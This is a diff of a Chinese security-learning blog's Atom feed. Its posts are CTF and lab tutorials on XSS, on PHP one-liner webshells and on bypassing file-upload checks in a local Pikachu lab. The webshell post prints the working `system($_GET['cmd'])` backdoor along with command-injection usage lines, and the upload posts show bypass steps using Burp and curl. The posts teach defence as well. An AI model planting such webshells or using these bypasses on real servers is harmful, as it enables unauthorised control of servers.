@@ -10,15 +10,34 @@
   <rights>All rights reserved 2026, Crow.</rights>
   <subtitle>Crow. 的网络安全学习记录，记录 CTF、Web 安全与从 0 到 1 的成长过程。</subtitle>
   <title>Crow.</title>
-  <updated>2026-11-17T08:44:56.947Z</updated>
+  <updated>2026-11-18T04:39:38.955Z</updated>
+  <entry>
+    <author>
+      <name>Crow.</name>
+    </author>
+    <content>
+      <![CDATA[<p>工具:</p><p>环境:</p><p>内容:</p><p>原理:</p>]]>
+    </content>
+    <id>https://lzzy-rz.github.io/Crow.github.io/2026/11/18/%E6%A2%B3%E7%90%86%E7%8E%B0%E9%98%B6%E6%AE%B5%E5%B8%B8%E8%A7%81%E7%9A%84Webshell/</id>
+    <link href="https://lzzy-rz.github.io/Crow.github.io/2026/11/18/%E6%A2%B3%E7%90%86%E7%8E%B0%E9%98%B6%E6%AE%B5%E5%B8%B8%E8%A7%81%E7%9A%84Webshell/"/>
+    <published>2026-11-18T04:39:38.000Z</published>
+    <summary>
+      <![CDATA[<p>工具:</p>
+<p>环境:</p>
+<p>内容:</p>
+<p>原理:</p>]]>
+    </summary>
+    <title>梳理现阶段常见的Webshell</title>
+    <updated>2026-11-18T04:39:38.955Z</updated>
+  </entry>
   <entry>
     <author>
       <name>Crow.</name>
     </author>
     <category term="XSS" scheme="https://lzzy-rz.github.io/Crow.github.io/categories/XSS/"/>
     <category term="Web" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Web/"/>
-    <category term="CTF" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/CTF/"/>
     <category term="XSS" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/XSS/"/>
+    <category term="CTF" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/CTF/"/>
     <content>
       <![CDATA[<p>工具:Internet</p><p>环境:本机</p><p>内容:简单梳理一下XSS的知识,给后面的学习铺路</p><h2 id="1-XSS的本质"><a href="#1-XSS的本质" class="headerlink" title="1,XSS的本质"></a>1,XSS的本质</h2><p>网站的输入框很多是’模板+用户输入’拼接出来的,如果该转义的地方没转义,黑客输入的<code>&lt;</code>,”这类字符,或者<code>&lt;script&gt;</code>这类标签,就原样进入了网页的HTML,浏览器解析后就会执行.除了输入框,还有参数,URL,留言,这些也是注入点</p><h2 id="2-攻击对象"><a href="#2-攻击对象" class="headerlink" title="2,攻击对象"></a>2,攻击对象</h2><p>浏览器,黑客把payload拼进URL,并将URL传播,只要用户点击访问这个URL,服务器就把带着payload的HTML发出去,让用户的浏览器执行,从而得到用户的Cookie,会话,页面操作权.</p><h2 id="3-三种类型"><a href="#3-三种类型" class="headerlink" title="3,三种类型"></a>3,三种类型</h2><ul><li><strong>A,反射型:</strong> 输入在URL的参数里,服务器原样拼进返回界面,不落库,每次靠链接诱导点击,是一次性的</li><li><strong>B,存储型:</strong> 输入存进数据库(留言,昵称,评论),页面渲染时再读出来,拼进去,任何人只要此页面就会中招,不用点特定链接,危害最大</li><li><strong>C,DOM型:</strong> payload不经过服务器,在URL里.服务器返回的HTML永远是同一份,里面有一段JS,这段JS会去读location.hash(#后面的部分)或者location.search(?后面的部分),然后把读到的内容塞进innerHTML,document.write,eval这类地方.因为服务器发的HTML是同一份,所以抓包看不见有用回显</li></ul><h2 id="4-防御"><a href="#4-防御" class="headerlink" title="4,防御"></a>4,防御</h2><ul><li><strong>A,将编码输出:</strong> 把<code>&lt;&gt;&#39;&quot;&amp;</code>转成实体</li><li><strong>B,输入校验:</strong> 做白名单或黑名单</li><li><strong>C,CSP:</strong> 用响应头限制脚本只能从哪些源加载,inline script默认不执行</li><li><strong>D,HttpOnly:</strong> 将Cookie加上这个标记,JS读不到document.cookie,偷不到会话.它防不了XSS本身,但是能砍掉关键信息,避免被盗</li><li><strong>E,框架默认转义:</strong> Vue,React默认转义,除非用v-html,dangerouslySetInnerHTML这类口子</li></ul><h2 id="5-CTF中XSS的题型"><a href="#5-CTF中XSS的题型" class="headerlink" title="5,CTF中XSS的题型"></a>5,CTF中XSS的题型</h2><ul><li><strong>A,考找注入点和闭合</strong></li><li><strong>B,过滤绕过:</strong> 遇到过滤–&gt;大小写,双写,编码</li><li><strong>C,存储型:</strong> 比如留言板,提交后管理员会来看,常见的是盗管理员的Cookie</li><li><strong>D,DOM型:</strong> 找sink,payload,抓包看不到</li><li><strong>E,XSS盲打:</strong> 没回显,得挂个接收端,等管理员访问回连</li><li><strong>F,结合CSRF:</strong> 借XSS发请求改密码,添加自己为管理员</li></ul><hr><p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>]]>
     </content>
@@ -233,15 +252,15 @@
     <content>
       <![CDATA[<p>今天时间充足,效率也不错,在此梳理整理一下一句话木马的使用方法,以及如何防守</p><h2 id="何为一句话木马"><a href="#何为一句话木马" class="headerlink" title="何为一句话木马:"></a>何为一句话木马:</h2><p>本质是一段极其简单的恶意脚本,以php为例,最经典的一句话木马如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>逐词解析:</p><ul><li><code>&lt;?php ... ?&gt;</code> 标识符,告诉服务器中间的内容请当做php代码来执行.</li><li><code>system(...)</code> php的内置函数,作用是执行系统底层命令</li><li><code>$_GET[&#39;cmd&#39;]</code> 用来接收参数(Hey bro,去浏览器的URL里找一个叫cmd的参数,把它的值拿过来)</li></ul><p>总结:就像遥控器一样,只要你通过URL里传入一个名为cmd的命令,服务器就会执行</p><h2 id="关键1-找到地址"><a href="#关键1-找到地址" class="headerlink" title="关键1:找到地址"></a>关键1:找到地址</h2><p>Why:我们通过文件上传一句话木马后还不够,因为文件上传之后处于”休眠”状态,我们必须通过准确的URL路径访问,才能触发服务器的解析并执行代码.</p><p>How:真实环境中服务器通常会重命名或移动上传文件,可以通过报错回显,目录扫描,或全盘搜索(grep)确认绝对路径,才能成功连接并控制服务器.(By the way,现在这些我都不会,keep going!)错误路径会给404,路径正确会返回200</p><h2 id="关键2-测试权限"><a href="#关键2-测试权限" class="headerlink" title="关键2:测试权限"></a>关键2:测试权限</h2><p>用?cmd&#x3D;whoami测试成功后,会返回用户名</p><p>www-data&#x2F;apache&#x2F;nginx是web的普通员工权限,是绝大多数漏洞拿到的权限</p><p>root是最高统帅,可以让整个系统想干嘛干嘛.</p><h2 id="关健3-调用指令"><a href="#关健3-调用指令" class="headerlink" title="关健3:调用指令"></a>关健3:调用指令</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">1,看根目录: ?cmd=ls /<br>2,看当前目录: ?cmd=ls<br>3,找到可以文件后读取: ?cmd=cat /flag.txt<br></code></pre></td></tr></table></figure><p>*在ctf中如果是空白页,可以尝试用base64强转,再去解码</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?cmd=base64 /flag_xxx.php<br></code></pre></td></tr></table></figure><h2 id="4-防守策略"><a href="#4-防守策略" class="headerlink" title="4:防守策略"></a>4:防守策略</h2><p>1,禁用危险函数<br>2,严格校验文件上传:MIME类型,文件后缀,文件头<br>3,重命名文件</p><hr><p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>]]>
     </content>
-    <id>https://lzzy-rz.github.io/Crow.github.io/2026/10/23/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%B0%8F%E4%B8%93%E6%A0%8F/</id>
-    <link href="https://lzzy-rz.github.io/Crow.github.io/2026/10/23/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%B0%8F%E4%B8%93%E6%A0%8F/"/>
+    <id>https://lzzy-rz.github.io/Crow.github.io/2026/10/23/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC(cmd%E5%9E%8B)%E5%B0%8F%E4%B8%93%E6%A0%8F/</id>
+    <link href="https://lzzy-rz.github.io/Crow.github.io/2026/10/23/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC(cmd%E5%9E%8B)%E5%B0%8F%E4%B8%93%E6%A0%8F/"/>
     <published>2026-10-23T07:12:52.000Z</published>
     <summary>
       <![CDATA[<p>今天时间充足,效率也不错,在此梳理整理一下一句话木马的使用方法,以及如何防守</p>
 <h2 id="何为一句话木马"><a href="#何为一句话木马" class="headerlink" title="何为一句话木马:"></a>何为一句话木马:</h2><p>本质]]>
     </summary>
-    <title>一句话木马小专栏</title>
-    <updated>2026-10-25T03:59:35.610Z</updated>
+    <title>一句话木马(cmd型)小专栏</title>
+    <updated>2026-11-18T04:44:08.781Z</updated>
   </entry>
   <entry>
     <author>
@@ -273,8 +292,8 @@
     </author>
     <category term="文件上传" scheme="https://lzzy-rz.github.io/Crow.github.io/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
     <category term="文件上传" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
-    <category term="Burp Suite" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Burp-Suite/"/>
     <category term="Pikachu" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Pikachu/"/>
+    <category term="Burp Suite" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Burp-Suite/"/>
     <category term="MIME" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/MIME/"/>
     <content>
       <![CDATA[<p>工具:Burpsuite</p><p>环境:本地 Pikachu 靶场</p><p>内容:挖掘文件上传MIME Type的漏洞</p><p>原理:MIME相当于一个快递箱,上面可以标注快递箱里的物品类别,但是我们是发件人,可以自己更换箱子,标签可以告诉服务器该怎么处理，但不一定代表里面真的是什么.</p><h2 id="1-使用火狐浏览器打开本地的皮卡丘靶场-打开Burpsuite"><a href="#1-使用火狐浏览器打开本地的皮卡丘靶场-打开Burpsuite" class="headerlink" title="1,使用火狐浏览器打开本地的皮卡丘靶场,打开Burpsuite"></a>1,使用火狐浏览器打开本地的皮卡丘靶场,打开Burpsuite</h2><h2 id="2-打开Burpsuite的intercept-上传我们的proof-php文件"><a href="#2-打开Burpsuite的intercept-上传我们的proof-php文件" class="headerlink" title="2,打开Burpsuite的intercept,上传我们的proof.php文件"></a>2,打开Burpsuite的intercept,上传我们的proof.php文件</h2><p>但是一直无法抓到包,所以改用了Burp自带的浏览器</p><p>这一次很成功的拦截到了</p><img width="1314" height="632" alt="Image" src="https://github.com/user-attachments/assets/117a54aa-fcce-40f3-889e-1caf9327b3b3" /><h2 id="3-找到包里的Content-Type"><a href="#3-找到包里的Content-Type" class="headerlink" title="3,找到包里的Content-Type"></a>3,找到包里的Content-Type</h2><img width="614" height="42" alt="Image" src="https://github.com/user-attachments/assets/b6573aae-0bd9-4da9-81bd-a2383d6e7bcf" /><p>我们将这里的Content-Type改为image&#x2F;png  并将请求放行</p><h2 id="4-页面上给出了文件的保存路径-访问"><a href="#4-页面上给出了文件的保存路径-访问" class="headerlink" title="4,页面上给出了文件的保存路径,访问"></a>4,页面上给出了文件的保存路径,访问</h2><img width="1134" height="570" alt="Image" src="https://github.com/user-attachments/assets/eea3d884-c483-4ad1-bdf5-6f07c6e0843b" /><p>访问路径,看到了我们让服务器输出的文字</p><img width="1134" height="918" alt="Image" src="https://github.com/user-attachments/assets/a58c3ae7-28c8-4467-af99-2cf04aab4d6a" /><p>说明服务器相信了客户端自己填写的 MIME<br>proof.php 能执行也说明上传目录没禁 PHP</p><hr><p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>]]>
@@ -297,9 +316,9 @@
     </author>
     <category term="文件上传" scheme="https://lzzy-rz.github.io/Crow.github.io/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
     <category term="文件上传" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
-    <category term="Burp Suite" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Burp-Suite/"/>
     <category term="Curl" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Curl/"/>
     <category term="Pikachu" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Pikachu/"/>
+    <category term="Burp Suite" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Burp-Suite/"/>
     <content>
       <![CDATA[<p>工具:Burpsuite,Curl</p><p>环境:本地 Pikachu 靶场</p><p>内容:挖掘文件上传client check的漏洞</p><p>原理:用户选择文件时,会检查文件扩展名,选择其他类型文件时,浏览器的JS就已经拦截了(请求没发送出去),所以采用用图片后缀的方式,绕过浏览器的拦截,让它成功发送请求.我们拦截发送的请求,并将伪装过的文件换回原来的后缀,发送给服务器.如果服务器没有拦截,并且能执行我们上传的代码,说明改服务器可被控制.</p><h2 id="1-先打开Burpsuite用自带的浏览器进入我们的靶场"><a href="#1-先打开Burpsuite用自带的浏览器进入我们的靶场" class="headerlink" title="1,先打开Burpsuite用自带的浏览器进入我们的靶场"></a>1,先打开Burpsuite用自带的浏览器进入我们的靶场</h2><img width="1216" height="1259" alt="Image" src="https://github.com/user-attachments/assets/02de7cc3-1540-4f38-98ec-48acff7a803f" /><p>上面显示仅允许上传图片</p><h2 id="2-打开burpsuite的intercept-上传一个-png图片-来看请求结构"><a href="#2-打开burpsuite的intercept-上传一个-png图片-来看请求结构" class="headerlink" title="2,打开burpsuite的intercept,上传一个.png图片,来看请求结构"></a>2,打开burpsuite的intercept,上传一个.png图片,来看请求结构</h2><img width="330" height="18" alt="Image" src="https://github.com/user-attachments/assets/fdddff79-8149-42bf-8423-05dc9a191604" /><p>确认浏览器按multipart接受文件</p><h2 id="3-将文件改成-txt看服务器接不接受"><a href="#3-将文件改成-txt看服务器接不接受" class="headerlink" title="3,将文件改成.txt看服务器接不接受"></a>3,将文件改成.txt看服务器接不接受</h2><p>将请求发送到repeater</p><p>将后缀.png改为.txt</p><p>Send</p><p>服务器返回200,说明拦截发生在浏览器,服务器没拦</p><h2 id="4-验证文件是否可以打开"><a href="#4-验证文件是否可以打开" class="headerlink" title="4,验证文件是否可以打开"></a>4,验证文件是否可以打开</h2><img width="242" height="38" alt="Image" src="https://github.com/user-attachments/assets/f786b0f5-7f8b-4110-8502-b7bb9be2d021" /><p>刷新后网页上给出了保存路径</p><p>直接复制访问文件是否可以打开</p><img width="1217" height="1324" alt="Image" src="https://github.com/user-attachments/assets/9e15f11c-fe94-4e94-aa92-c7a04157949c" /><p>成功地返回了我们发送的图片(说明服务器并未对上传的文件类型进行限制)</p><h2 id="5-我们进一步确认服务器是否真正的能够执行我们上传的代码"><a href="#5-我们进一步确认服务器是否真正的能够执行我们上传的代码" class="headerlink" title="5,我们进一步确认服务器是否真正的能够执行我们上传的代码"></a>5,我们进一步确认服务器是否真正的能够执行我们上传的代码</h2><p>新建一个写入了php代码的文件(命名为proof.php)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;UPLOAD_PROOF_OK&quot;</span>; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>(如果服务器成功执行,会向我们返回UPLOAD_PROOF_OK)</p><p>打开终端,使用Curl直接向服务器发送我们的.php文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -i -F <span class="hljs-string">&quot;uploadfile=@<span class="hljs-variable">$HOME</span>/Desktop/proof.php;filename=proof.php&quot;</span> \  http://127.0.0.1:8080/vul/unsafeupload/clientcheck.php<br></code></pre></td></tr></table></figure><p>最后根据ctrl+shift+F的功能,在终端中找到了文件保存的路径</p><img width="1209" height="128" alt="Image" src="https://github.com/user-attachments/assets/94be5dc8-bcdc-4cef-b0ea-8864ed128691" /><p>访问后得到了结果(说明服务器可以执行我们上传的内容)<br>即我们可用服务器不对上传文件验证的漏洞,向服务器发送指令,使之执行.</p><hr><p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>]]>
     </content>
